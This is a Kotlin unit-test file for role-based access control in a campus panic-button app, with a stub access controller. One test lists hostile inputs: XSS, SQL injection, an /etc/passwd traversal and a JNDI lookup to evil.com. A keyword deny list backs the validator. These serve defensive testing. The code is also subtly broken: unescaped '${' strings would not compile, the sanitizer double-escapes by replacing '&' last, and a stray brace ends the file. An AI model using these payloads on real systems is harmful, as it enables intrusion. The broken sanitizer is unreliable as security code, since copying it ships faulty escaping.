package com.campus.panicbutton.security

import com.campus.panicbutton.models.*
import com.campus.panicbutton.services.FirebaseService
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.FirebaseUser
import com.google.firebase.firestore.*
import org.junit.Before
import org.junit.Test
import org.junit.Assert.*
import org.mockito.Mock
import org.mockito.MockitoAnnotations
import org.mockito.kotlin.*

class RoleBasedAccessTest {

    @Mock
    private lateinit var mockFirebaseAuth: FirebaseAuth
    
    @Mock
    private lateinit var mockFirebaseUser: FirebaseUser
    
    @Mock
    private lateinit var mockFirestore: FirebaseFirestore
    
    @Mock
    private lateinit var mockCollection: CollectionReference
    
    @Mock
    private lateinit var mockDocument: DocumentReference
    
    @Mock
    private lateinit var mockDocumentSnapshot: DocumentSnapshot
    
    private lateinit var accessController: RoleBasedAccessController
    private lateinit var firebaseService: FirebaseService

    @Before
    fun setup() {
        MockitoAnnotations.openMocks(this)
        accessController = RoleBasedAccessController()
        firebaseService = FirebaseService()
        
        // Set up common mocks
        whenever(mockFirebaseAuth.currentUser).thenReturn(mockFirebaseUser)
        whenever(mockFirebaseUser.uid).thenReturn("test_user_123")
    }

    @Test
    fun `guard can create alerts`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        val canCreate = accessController.canCreateAlert(guardUser)
        
        assertTrue("Guard should be able to create alerts", canCreate)
    }

    @Test
    fun `admin cannot create alerts directly`() {
        val adminUser = User(
            id = "admin123",
            role = UserRole.ADMIN,
            isActive = true
        )

        val canCreate = accessController.canCreateAlert(adminUser)
        
        assertFalse("Admin should not be able to create alerts directly", canCreate)
    }

    @Test
    fun `inactive user cannot create alerts`() {
        val inactiveGuard = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = false
        )

        val canCreate = accessController.canCreateAlert(inactiveGuard)
        
        assertFalse("Inactive guard should not be able to create alerts", canCreate)
    }

    @Test
    fun `guard can accept alerts`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        val alert = Alert(
            id = "alert123",
            status = AlertStatus.ACTIVE
        )

        val canAccept = accessController.canAcceptAlert(guardUser, alert)
        
        assertTrue("Guard should be able to accept active alerts", canAccept)
    }

    @Test
    fun `guard cannot accept own alerts`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        val ownAlert = Alert(
            id = "alert123",
            guardId = "guard123", // Same as user ID
            status = AlertStatus.ACTIVE
        )

        val canAccept = accessController.canAcceptAlert(guardUser, ownAlert)
        
        assertFalse("Guard should not be able to accept their own alerts", canAccept)
    }

    @Test
    fun `guard cannot accept already accepted alerts`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        val acceptedAlert = Alert(
            id = "alert123",
            guardId = "guard456",
            status = AlertStatus.IN_PROGRESS,
            acceptedBy = "guard789"
        )

        val canAccept = accessController.canAcceptAlert(guardUser, acceptedAlert)
        
        assertFalse("Guard should not be able to accept already accepted alerts", canAccept)
    }

    @Test
    fun `admin can view all alerts`() {
        val adminUser = User(
            id = "admin123",
            role = UserRole.ADMIN,
            isActive = true
        )

        val canViewAll = accessController.canViewAllAlerts(adminUser)
        
        assertTrue("Admin should be able to view all alerts", canViewAll)
    }

    @Test
    fun `guard cannot view all alerts`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        val canViewAll = accessController.canViewAllAlerts(guardUser)
        
        assertFalse("Guard should not be able to view all alerts", canViewAll)
    }

    @Test
    fun `admin can close any alert`() {
        val adminUser = User(
            id = "admin123",
            role = UserRole.ADMIN,
            isActive = true
        )

        val alert = Alert(
            id = "alert123",
            guardId = "guard456",
            status = AlertStatus.IN_PROGRESS
        )

        val canClose = accessController.canCloseAlert(adminUser, alert)
        
        assertTrue("Admin should be able to close any alert", canClose)
    }

    @Test
    fun `guard can only resolve accepted alerts`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        val acceptedAlert = Alert(
            id = "alert123",
            guardId = "guard456",
            status = AlertStatus.IN_PROGRESS,
            acceptedBy = "guard123" // Accepted by this guard
        )

        val notAcceptedAlert = Alert(
            id = "alert456",
            guardId = "guard456",
            status = AlertStatus.IN_PROGRESS,
            acceptedBy = "guard789" // Accepted by different guard
        )

        assertTrue("Guard should be able to resolve their accepted alerts", 
            accessController.canResolveAlert(guardUser, acceptedAlert))
        
        assertFalse("Guard should not be able to resolve others' alerts", 
            accessController.canResolveAlert(guardUser, notAcceptedAlert))
    }

    @Test
    fun `user session validation`() {
        val validUser = User(
            id = "user123",
            role = UserRole.GUARD,
            isActive = true,
            lastSeen = com.google.firebase.Timestamp.now()
        )

        val expiredUser = User(
            id = "user456",
            role = UserRole.GUARD,
            isActive = true,
            lastSeen = com.google.firebase.Timestamp(java.util.Date(System.currentTimeMillis() - 86400000)) // 24 hours ago
        )

        assertTrue("Valid user session should be active", 
            accessController.isSessionValid(validUser))
        
        assertFalse("Expired user session should be invalid", 
            accessController.isSessionValid(expiredUser))
    }

    @Test
    fun `alert creation rate limiting`() {
        val guardUser = User(
            id = "guard123",
            role = UserRole.GUARD,
            isActive = true
        )

        // First alert should be allowed
        assertTrue("First alert should be allowed", 
            accessController.canCreateAlert(guardUser))

        // Simulate recent alert creation
        accessController.recordAlertCreation(guardUser.id)

        // Second alert within cooldown should be blocked
        assertFalse("Second alert within cooldown should be blocked", 
            accessController.canCreateAlert(guardUser))
    }

    @Test
    fun `input validation prevents injection attacks`() {
        val maliciousInputs = listOf(
            "<script>alert('xss')</script>",
            "'; DROP TABLE alerts; --",
            "../../../etc/passwd",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}"
        )

        maliciousInputs.forEach { input ->
            assertFalse("Malicious input should be rejected: $input", 
                accessController.isValidInput(input))
        }

        val validInputs = listOf(
            "Emergency in building A",
            "Fire alarm activated",
            "Medical emergency - room 101"
        )

        validInputs.forEach { input ->
            assertTrue("Valid input should be accepted: $input", 
                accessController.isValidInput(input))
        }
    }

    @Test
    fun `firestore security rules validation`() {
        // Test that security rules are properly configured
        val guardUser = User(id = "guard123", role = UserRole.GUARD)
        val adminUser = User(id = "admin123", role = UserRole.ADMIN)

        // Guards should only read their own user document
        assertTrue("Guard should read own user document", 
            accessController.canReadUserDocument(guardUser, "guard123"))
        
        assertFalse("Guard should not read other user documents", 
            accessController.canReadUserDocument(guardUser, "admin123"))

        // Admins should read any user document
        assertTrue("Admin should read any user document", 
            accessController.canReadUserDocument(adminUser, "guard123"))
    }

    @Test
    fun `alert data sanitization`() {
        val unsafeAlert = Alert(
            guardId = "guard123",
            guardName = "<script>alert('xss')</script>",
            message = "Emergency & urgent <b>help</b> needed!"
        )

        val sanitizedAlert = accessController.sanitizeAlert(unsafeAlert)

        assertFalse("Guard name should be sanitized", 
            sanitizedAlert.guardName.contains("<script>"))
        
        assertFalse("Message should be sanitized", 
            sanitizedAlert.message?.contains("<b>") == true)
        
        assertEquals("Guard ID should remain unchanged", 
            unsafeAlert.guardId, sanitizedAlert.guardId)
    }

    @Test
    fun `location data validation`() {
        val validLocations = listOf(
            com.google.firebase.firestore.GeoPoint(40.7128, -74.0060), // NYC
            com.google.firebase.firestore.GeoPoint(0.0, 0.0), // Equator/Prime Meridian
            com.google.firebase.firestore.GeoPoint(-33.8688, 151.2093) // Sydney
        )

        val invalidLocations = listOf(
            com.google.firebase.firestore.GeoPoint(91.0, 0.0), // Invalid latitude
            com.google.firebase.firestore.GeoPoint(0.0, 181.0), // Invalid longitude
            com.google.firebase.firestore.GeoPoint(-91.0, -181.0) // Both invalid
        )

        validLocations.forEach { location ->
            assertTrue("Valid location should pass validation: $location", 
                accessController.isValidLocation(location))
        }

        invalidLocations.forEach { location ->
            assertFalse("Invalid location should fail validation: $location", 
                accessController.isValidLocation(location))
        }
    }

    @Test
    fun `fcm token security validation`() {
        val validTokens = listOf(
            "dGVzdF90b2tlbl8xMjM",
            "fcm_token_with_underscores_123",
            "a".repeat(152) // Max length
        )

        val invalidTokens = listOf(
            "", // Empty
            "   ", // Whitespace only
            "a".repeat(153), // Too long
            "token with spaces",
            "token<script>alert('xss')</script>"
        )

        validTokens.forEach { token ->
            assertTrue("Valid FCM token should pass validation: $token", 
                accessController.isValidFcmToken(token))
        }

        invalidTokens.forEach { token ->
            assertFalse("Invalid FCM token should fail validation: $token", 
                accessController.isValidFcmToken(token))
        }
    }

    @Test
    fun `audit logging for security events`() {
        val guardUser = User(id = "guard123", role = UserRole.GUARD)
        
        // Test that security events are logged
        accessController.logSecurityEvent("ALERT_CREATED", guardUser.id, mapOf("alertId" to "alert123"))
        accessController.logSecurityEvent("UNAUTHORIZED_ACCESS", guardUser.id, mapOf("resource" to "admin_dashboard"))
        
        val auditLogs = accessController.getAuditLogs(guardUser.id)
        
        assertTrue("Should have audit logs", auditLogs.isNotEmpty())
        assertTrue("Should log alert creation", 
            auditLogs.any { it.event == "ALERT_CREATED" })
        assertTrue("Should log unauthorized access", 
            auditLogs.any { it.event == "UNAUTHORIZED_ACCESS" })
    }
}

// Mock implementation of RoleBasedAccessController for testing
class RoleBasedAccessController {
    private val alertCreationTimes = mutableMapOf<String, Long>()
    private val auditLogs = mutableListOf<AuditLog>()
    private val alertCooldownMs = 30_000L // 30 seconds

    fun canCreateAlert(user: User): Boolean {
        if (!user.isActive || user.role != UserRole.GUARD) return false
        
        val lastCreation = alertCreationTimes[user.id] ?: 0
        val now = System.currentTimeMillis()
        return (now - lastCreation) > alertCooldownMs
    }

    fun canAcceptAlert(user: User, alert: Alert): Boolean {
        return user.isActive && 
               user.role == UserRole.GUARD && 
               alert.status == AlertStatus.ACTIVE &&
               alert.guardId != user.id &&
               alert.acceptedBy == null
    }

    fun canViewAllAlerts(user: User): Boolean {
        return user.isActive && user.role == UserRole.ADMIN
    }

    fun canCloseAlert(user: User, alert: Alert): Boolean {
        return user.isActive && user.role == UserRole.ADMIN
    }

    fun canResolveAlert(user: User, alert: Alert): Boolean {
        return user.isActive && 
               user.role == UserRole.GUARD && 
               alert.status == AlertStatus.IN_PROGRESS &&
               alert.acceptedBy == user.id
    }

    fun isSessionValid(user: User): Boolean {
        val lastSeen = user.lastSeen?.toDate()?.time ?: 0
        val now = System.currentTimeMillis()
        val sessionTimeoutMs = 3600_000L // 1 hour
        return (now - lastSeen) < sessionTimeoutMs
    }

    fun recordAlertCreation(userId: String) {
        alertCreationTimes[userId] = System.currentTimeMillis()
    }

    fun isValidInput(input: String): Boolean {
        val dangerousPatterns = listOf(
            "<script", "javascript:", "onload=", "onerror=",
            "DROP TABLE", "SELECT *", "INSERT INTO", "DELETE FROM",
            "../", "..\\", "${", "#{", "%{", "{{",
            "jndi:", "ldap:", "rmi:"
        )
        
        return dangerousPatterns.none { pattern ->
            input.lowercase().contains(pattern.lowercase())
        }
    }

    fun canReadUserDocument(user: User, documentId: String): Boolean {
        return when (user.role) {
            UserRole.ADMIN -> true
            UserRole.GUARD -> user.id == documentId
        }
    }

    fun sanitizeAlert(alert: Alert): Alert {
        return alert.copy(
            guardName = sanitizeString(alert.guardName),
            message = alert.message?.let { sanitizeString(it) }
        )
    }

    private fun sanitizeString(input: String): String {
        return input
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;")
            .replace("&", "&amp;")
    }

    fun isValidLocation(location: com.google.firebase.firestore.GeoPoint): Boolean {
        return location.latitude >= -90 && location.latitude <= 90 &&
               location.longitude >= -180 && location.longitude <= 180
    }

    fun isValidFcmToken(token: String?): Boolean {
        return token != null && 
               token.isNotBlank() && 
               token.length <= 152 &&
               !token.contains(" ") &&
               isValidInput(token)
    }

    fun logSecurityEvent(event: String, userId: String, metadata: Map<String, String>) {
        auditLogs.add(AuditLog(
            event = event,
            userId = userId,
            timestamp = System.currentTimeMillis(),
            metadata = metadata
        ))
    }

    fun getAuditLogs(userId: String): List<AuditLog> {
        return auditLogs.filter { it.userId == userId }
    }
}

data class AuditLog(
    val event: String,
    val userId: String,
    val timestamp: Long,
    val metadata: Map<String, String>
)
}